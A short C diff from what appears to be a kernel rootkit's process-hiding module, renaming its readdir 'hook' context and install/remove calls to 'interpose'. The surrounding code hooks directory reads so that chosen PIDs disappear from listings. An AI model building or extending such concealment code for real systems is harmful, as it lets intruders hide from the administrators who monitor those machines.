@@ -26,7 +26,7 @@ static __always_inline int _neverc_krt_atoi(const char *s, int len)
 struct neverc_krt_pid_hide_state {
 	int              pids[NEVERC_KRT_HIDE_PID_MAX];
 	int              count;
-	struct neverc_krt_hook_ctx ctx_hook;
+	struct neverc_krt_interpose_ctx ctx_interpose;
 	int              active;
 };
 
@@ -167,7 +167,7 @@ int neverc_krt_pid_hide_install(void)
 		return 0;
 	}
 
-	int ret = neverc_krt_hook_install_ctx(&_neverc_krt_pid_state.ctx_hook,
+	int ret = neverc_krt_interpose_install_ctx(&_neverc_krt_pid_state.ctx_interpose,
 				       target, _neverc_krt_pid_readdir_ctx,
 				       (void *)0);
 	if (ret) {
@@ -182,8 +182,8 @@ int neverc_krt_pid_hide_install(void)
 void neverc_krt_pid_hide_cleanup(void)
 {
 	if (!_neverc_krt_pid_state.active) return;
-	if (_neverc_krt_pid_state.ctx_hook.base.active)
-		neverc_krt_hook_remove_ctx(&_neverc_krt_pid_state.ctx_hook);
+	if (_neverc_krt_pid_state.ctx_interpose.base.active)
+		neverc_krt_interpose_remove_ctx(&_neverc_krt_pid_state.ctx_interpose);
 	_neverc_krt_pid_state.active = 0;
 	_neverc_krt_pid_state.count = 0;
 }
